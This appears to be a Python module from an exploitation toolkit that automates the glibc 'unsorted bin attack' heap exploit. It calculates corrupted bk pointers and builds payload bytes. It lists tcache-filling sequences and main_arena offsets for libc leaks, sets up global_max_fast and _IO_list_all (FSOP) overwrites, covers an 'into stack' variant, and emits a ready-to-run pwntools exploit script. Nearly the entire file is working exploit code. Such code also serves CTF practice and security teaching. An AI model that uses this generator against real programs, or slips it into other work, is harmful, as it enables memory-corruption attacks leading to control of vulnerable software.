"""
Unsorted Bin Attack exploitation technique.

Corrupts the unsorted bin to write a main_arena pointer to an arbitrary
location. Useful for leaking libc addresses or overwriting global variables.

Requirements:
- UAF or heap overflow to corrupt freed chunk's bk pointer
- Chunk in unsorted bin (size > fastbin, tcache full or not applicable)
- Allocation to trigger the write

References:
- https://github.com/shellphish/how2heap/blob/master/glibc_2.23/unsorted_bin_attack.c
- https://github.com/shellphish/how2heap/blob/master/glibc_2.23/unsorted_bin_into_stack.c
"""

from dataclasses import dataclass, field
from typing import Any, Dict, List, Optional, Tuple

from supwngo.utils.helpers import p64, p32
from supwngo.utils.logging import get_logger

logger = get_logger(__name__)


@dataclass
class UnsortedBinConfig:
    """Configuration for unsorted bin attack."""
    bits: int = 64
    libc_version: str = "2.27"
    has_tcache: bool = True


class UnsortedBinAttack:
    """
    Unsorted Bin Attack exploitation technique.

    When a chunk is allocated from the unsorted bin, the following occurs:
        victim->bk->fd = unsorted_chunks(av)

    By corrupting victim->bk to (target - 0x10), we write main_arena+88
    to the target address.

    This is useful for:
    - Leaking libc (if target is readable)
    - Overwriting global_max_fast
    - Overwriting _IO_list_all (for FSOP)

    Limitations (glibc >= 2.29):
    - Added check: victim->bk->fd == victim
    - Unsorted bin attack patched, need House of Einherjar or other techniques
    """

    def __init__(self, bits: int = 64, libc_version: str = "2.27"):
        """
        Initialize Unsorted Bin Attack exploiter.

        Args:
            bits: Architecture bits (32 or 64)
            libc_version: Target glibc version
        """
        self.bits = bits
        self.pack = p64 if bits == 64 else p32
        self.libc_version = libc_version

        # Chunk header size
        self.header_size = 16 if bits == 64 else 8
        self.ptr_size = 8 if bits == 64 else 4

        # Parse version
        self.major, self.minor = self._parse_version(libc_version)

        # tcache available in glibc >= 2.26
        self.has_tcache = self.major > 2 or (self.major == 2 and self.minor >= 26)

        # Unsorted bin attack patched in glibc 2.29
        self.is_patched = self.major > 2 or (self.major == 2 and self.minor >= 29)

        # Minimum size for unsorted bin (must avoid fastbin/tcache)
        self.min_unsorted_size = 0x420 if self.has_tcache else 0x90

        # main_arena offset from write location
        self.main_arena_offset = 0x60 if bits == 64 else 0x30  # unsorted_chunks(av)

    def _parse_version(self, version: str) -> Tuple[int, int]:
        """Parse glibc version string."""
        try:
            parts = version.split(".")
            return int(parts[0]), int(parts[1]) if len(parts) > 1 else 0
        except (ValueError, IndexError):
            return 2, 27

    def check_feasibility(self) -> Dict[str, Any]:
        """
        Check if unsorted bin attack is feasible.

        Returns:
            Feasibility analysis
        """
        result = {
            "feasible": True,
            "warnings": [],
            "requirements": [
                "UAF or heap overflow to modify freed chunk",
                "Ability to allocate from unsorted bin",
                f"Chunk size >= 0x{self.min_unsorted_size:x}",
            ],
        }

        if self.is_patched:
            result["feasible"] = False
            result["warnings"].append(
                f"glibc {self.libc_version} has unsorted bin integrity check (2.29+)"
            )
            result["warnings"].append(
                "Consider: House of Einherjar, large bin attack, or tcache poisoning"
            )

        if self.has_tcache:
            result["requirements"].append(
                "tcache must be full/bypassed (7 chunks or large size)"
            )

        return result

    def calculate_bk_value(self, target_addr: int) -> int:
        """
        Calculate bk value to write at target.

        The write is: victim->bk->fd = unsorted_chunks(av)
        fd is at offset 0x10 (64-bit) or 0x8 (32-bit) from chunk start.

        So bk should be: target - fd_offset

        Args:
            target_addr: Address to write main_arena pointer

        Returns:
            Value to write to bk
        """
        fd_offset = 0x10 if self.bits == 64 else 0x8
        return target_addr - fd_offset

    def generate_exploit(
        self,
        target_addr: int,
        chunk_size: int = 0,
    ) -> Dict[str, Any]:
        """
        Generate unsorted bin attack exploit.

        Args:
            target_addr: Address to write main_arena pointer
            chunk_size: Chunk size (0 = auto minimum)

        Returns:
            Exploit details
        """
        if chunk_size == 0:
            chunk_size = self.min_unsorted_size

        # Ensure chunk goes to unsorted bin
        if chunk_size < self.min_unsorted_size:
            chunk_size = self.min_unsorted_size

        bk_value = self.calculate_bk_value(target_addr)
        feasibility = self.check_feasibility()

        result = {
            "technique": "unsorted_bin_attack",
            "target": target_addr,
            "bk_value": bk_value,
            "chunk_size": chunk_size,
            "written_value": "main_arena + 0x60 (unsorted bin head)",
            "feasibility": feasibility,
            "steps": [],
        }

        if self.has_tcache:
            result["steps"].extend([
                f"1. Allocate 7 chunks of size 0x{chunk_size:x} to fill tcache",
                "2. Free all 7 chunks (fills tcache bin)",
                f"3. Allocate victim chunk (size 0x{chunk_size:x})",
                "4. Allocate guard chunk (prevents consolidation with top)",
            ])
        else:
            result["steps"].extend([
                f"1. Allocate victim chunk (size 0x{chunk_size:x})",
                "2. Allocate guard chunk (prevents consolidation with top)",
            ])

        result["steps"].extend([
            f"5. Free victim chunk (goes to unsorted bin)",
            f"6. Corrupt victim->bk to 0x{bk_value:x}",
            f"7. Allocate from unsorted bin (size 0x{chunk_size:x})",
            f"8. main_arena pointer written to 0x{target_addr:x}",
        ])

        return result

    def generate_libc_leak(
        self,
        readable_addr: int,
        chunk_size: int = 0,
    ) -> Dict[str, Any]:
        """
        Generate exploit to leak libc via unsorted bin.

        After the attack, readable_addr contains main_arena pointer.
        Calculate: libc_base = leaked_value - main_arena_offset

        Args:
            readable_addr: Address we can read from
            chunk_size: Chunk size

        Returns:
            Exploit for libc leak
        """
        exploit = self.generate_exploit(
            target_addr=readable_addr,
            chunk_size=chunk_size,
        )

        exploit["use_case"] = "libc_leak"
        exploit["steps"].append(
            f"9. Read 8 bytes from 0x{readable_addr:x} -> main_arena+0x60"
        )
        exploit["steps"].append(
            "10. Calculate: libc_base = leaked - main_arena_offset"
        )

        # Common main_arena offsets (varies by libc version)
        exploit["common_offsets"] = {
            "2.23": 0x3c4b20,
            "2.27": 0x3ebc40,
            "2.31": 0x1ecb80,
        }

        return exploit

    def generate_global_max_fast_attack(
        self,
        global_max_fast_addr: int,
        chunk_size: int = 0,
    ) -> Dict[str, Any]:
        """
        Generate exploit to overwrite global_max_fast.

        By setting global_max_fast to a large value, all chunks become
        "fastbin" sized, enabling fastbin attacks on large chunks.

        Args:
            global_max_fast_addr: Address of global_max_fast
            chunk_size: Chunk size

        Returns:
            Exploit for global_max_fast overwrite
        """
        exploit = self.generate_exploit(
            target_addr=global_max_fast_addr,
            chunk_size=chunk_size,
        )

        exploit["use_case"] = "global_max_fast"
        exploit["steps"].append(
            "9. global_max_fast now contains large value (main_arena ptr)"
        )
        exploit["steps"].append(
            "10. All chunks now treated as fastbin -> enables fastbin attacks"
        )

        return exploit

    def generate_io_list_all_attack(
        self,
        io_list_all_addr: int,
        chunk_size: int = 0,
    ) -> Dict[str, Any]:
        """
        Generate exploit to overwrite _IO_list_all.

        This is the first step of FSOP (File Stream Oriented Programming).
        After this, need to craft fake FILE structure.

        Args:
            io_list_all_addr: Address of _IO_list_all
            chunk_size: Chunk size

        Returns:
            Exploit for _IO_list_all overwrite
        """
        exploit = self.generate_exploit(
            target_addr=io_list_all_addr,
            chunk_size=chunk_size,
        )

        exploit["use_case"] = "fsop_setup"
        exploit["steps"].append(
            "9. _IO_list_all now points to main_arena region"
        )
        exploit["steps"].append(
            "10. Craft fake FILE in unsorted bin metadata"
        )
        exploit["steps"].append(
            "11. Trigger _IO_flush_all_lockp via exit/abort"
        )

        return exploit

    def tcache_fill_pattern(
        self,
        chunk_size: int,
        fill_count: int = 7,
    ) -> List[Dict[str, Any]]:
        """
        Generate allocation pattern to fill tcache.

        Args:
            chunk_size: Chunk size
            fill_count: Number of chunks (default 7)

        Returns:
            List of allocation operations
        """
        operations = []

        # Allocate fill_count chunks
        for i in range(fill_count):
            operations.append({
                "op": "alloc",
                "size": chunk_size,
                "name": f"filler_{i}",
            })

        # Free them all to fill tcache
        for i in range(fill_count):
            operations.append({
                "op": "free",
                "name": f"filler_{i}",
            })

        return operations

    def generate_payload(
        self,
        target_addr: int,
        preserve_fd: bool = False,
        fd_value: int = 0,
    ) -> bytes:
        """
        Generate payload to corrupt unsorted bin chunk.

        Args:
            target_addr: Target write address
            preserve_fd: Whether to preserve fd pointer
            fd_value: Value for fd if preserving

        Returns:
            Payload bytes
        """
        bk_value = self.calculate_bk_value(target_addr)

        payload = bytearray()

        if preserve_fd:
            # Keep original fd (or specified value)
            payload += self.pack(fd_value)
        else:
            # fd can be anything for basic attack
            payload += self.pack(0)

        # Corrupted bk pointer
        payload += self.pack(bk_value)

        return bytes(payload)

    def generate_pwntools_script(
        self,
        exploit: Dict[str, Any],
        alloc_func: str = "malloc",
        free_func: str = "free",
        edit_func: str = "edit",
    ) -> str:
        """
        Generate pwntools exploit script.

        Args:
            exploit: Exploit dict from generate_exploit
            alloc_func: Function to allocate
            free_func: Function to free
            edit_func: Function to edit chunk

        Returns:
            Python script string
        """
        script = f'''#!/usr/bin/env python3
"""
Unsorted Bin Attack Exploit
Target: 0x{exploit['target']:x}
Chunk Size: 0x{exploit['chunk_size']:x}
"""

from pwn import *

# Configuration
context.arch = "{'amd64' if self.bits == 64 else 'i386'}"
context.log_level = "debug"

# Addresses (update these)
TARGET = 0x{exploit['target']:x}
BK_VALUE = 0x{exploit['bk_value']:x}
CHUNK_SIZE = 0x{exploit['chunk_size']:x}

def exploit():
'''
        if self.has_tcache:
            script += f'''
    # Step 1-2: Fill tcache
    fillers = []
    for i in range(7):
        fillers.append({alloc_func}(CHUNK_SIZE))
    for i in range(7):
        {free_func}(fillers[i])

'''
        script += f'''
    # Allocate victim and guard
    victim = {alloc_func}(CHUNK_SIZE)
    guard = {alloc_func}(0x20)  # Prevent consolidation

    # Free victim to unsorted bin
    {free_func}(victim)

    # Corrupt bk pointer
    payload = p64(0)  # fd (can be anything)
    payload += p64(BK_VALUE)  # corrupted bk
    {edit_func}(victim, payload)

    # Trigger the write
    trigger = {alloc_func}(CHUNK_SIZE)

    log.success(f"main_arena pointer written to {{hex(TARGET)}}")

if __name__ == "__main__":
    exploit()
'''
        return script

    def summary(self) -> str:
        """Get technique summary."""
        feasibility = self.check_feasibility()
        status = "✓ Feasible" if feasibility["feasible"] else "✗ Patched"

        return f"""
Unsorted Bin Attack
===================
Architecture: {self.bits}-bit
glibc version: {self.libc_version}
Status: {status}

Requirements:
- UAF or heap overflow on unsorted bin chunk
- Chunk size >= 0x{self.min_unsorted_size:x} (avoids tcache/fastbin)
{'- Fill tcache first (7 chunks)' if self.has_tcache else ''}

What it does:
- Writes main_arena+0x60 to target address
- Useful for libc leaks, FSOP setup, global_max_fast

Warnings:
{chr(10).join('- ' + w for w in feasibility['warnings']) or '- None'}
"""


class UnsortedBinIntoStack:
    """
    Unsorted bin into stack variant.

    Instead of just writing main_arena, this technique allocates
    a chunk from the unsorted bin at an arbitrary address by
    corrupting both fd and bk, plus placing a fake chunk.
    """

    def __init__(self, bits: int = 64, libc_version: str = "2.27"):
        self.bits = bits
        self.pack = p64 if bits == 64 else p32
        self.libc_version = libc_version
        self.header_size = 16 if bits == 64 else 8

    def generate_exploit(
        self,
        target_addr: int,
        chunk_size: int = 0x100,
    ) -> Dict[str, Any]:
        """
        Generate unsorted bin into stack exploit.

        This requires placing a fake chunk at target and corrupting
        the unsorted bin list to include it.

        Args:
            target_addr: Stack/target address
            chunk_size: Size to request

        Returns:
            Exploit details
        """
        fake_chunk_addr = target_addr - self.header_size

        result = {
            "technique": "unsorted_bin_into_stack",
            "target": target_addr,
            "fake_chunk_addr": fake_chunk_addr,
            "chunk_size": chunk_size,
            "steps": [
                f"1. Place fake chunk at 0x{fake_chunk_addr:x}",
                "   - size: must match allocation request + 0x10",
                "   - bk: must point to valid chunk (pass bk->fd check)",
                "2. Free chunk to unsorted bin",
                "3. Corrupt freed chunk's bk to fake chunk",
                "4. Allocate with exact size -> returns target",
            ],
            "fake_chunk_layout": {
                "prev_size": 0,
                "size": chunk_size | 1,
                "fd": 0,  # Set to valid unsorted bin entry
                "bk": 0,  # Set to valid unsorted bin entry
            },
        }

        return result


def unsorted_bin_attack(
    target_addr: int,
    chunk_size: int = 0,
    bits: int = 64,
    libc_version: str = "2.27",
) -> Dict[str, Any]:
    """
    Convenience function for unsorted bin attack.

    Args:
        target_addr: Address to write main_arena pointer
        chunk_size: Chunk size (0 = auto)
        bits: Architecture bits
        libc_version: Target glibc version

    Returns:
        Exploit details
    """
    uba = UnsortedBinAttack(bits=bits, libc_version=libc_version)
    return uba.generate_exploit(
        target_addr=target_addr,
        chunk_size=chunk_size,
    )
